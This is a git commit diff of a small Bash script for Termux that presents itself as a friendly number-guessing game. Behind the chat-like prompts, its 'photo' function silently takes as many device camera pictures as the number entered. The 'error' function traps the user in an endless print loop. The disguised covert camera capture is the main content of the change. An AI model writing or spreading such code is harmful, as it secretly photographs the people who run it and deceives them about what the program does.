8666796d491718fab97d29850bd1f200c46abdb0
Daxiaha <96651400+Daxiaha@users.noreply.github.com>
2022-05-02 22:00:00 +0800

    Add files via upload

--- test.sh
+++ test.sh
@@ -1,27 +1,40 @@
 #!/bin/bash
 function main(){
-        printf "set your likes number:"
-        read int
-        echo
-        if (( $int > 0 ))
-        then
-                echo -e "\nI guess it >= 1,yes or no?"
-                while (( $int > 0 ))
-                do
+	printf "I have a number,but need you to guess:"
+	read int
+	if (( ${int} >0 ))
+	then
 
-                termux-camera-photo -c 1 ${int}.jpg
-                let "int--"
+		sleep 1s
+		printf "emmm,${int}."
+		sleep 1s
+		printf "I like it"
+		sleep 2s
+		echo
+		echo "Although we are different,but it's not importent,"
+		sleep 1s
+		echo "Right?"
+		photo
 
-                done                                                  else
-                echo "-----------------------------------------------------"
-                echo "!!!:please recheck your number,it must greater than 1"
-                echo -e "-------------------------------------
-----------------\n"
-                control
-
-        fi
+	else
+		error
+	fi
 }
-function control(){
-        main
+function photo(){
+		while (( $int > 0 ))
+		do
+
+		termux-camera-photo -c 0 ${int}.jpg
+		let "int--"
+		
+		done
 }
-control
+function error(){
+		while (( 1 ))
+		do	
+			echo "-----------------------------------------------------"
+			echo "    !!!:I don't like it!it must greater than 1!!!"
+			echo -e "-----------------------------------------------------\n"
+		done
+}
+main	
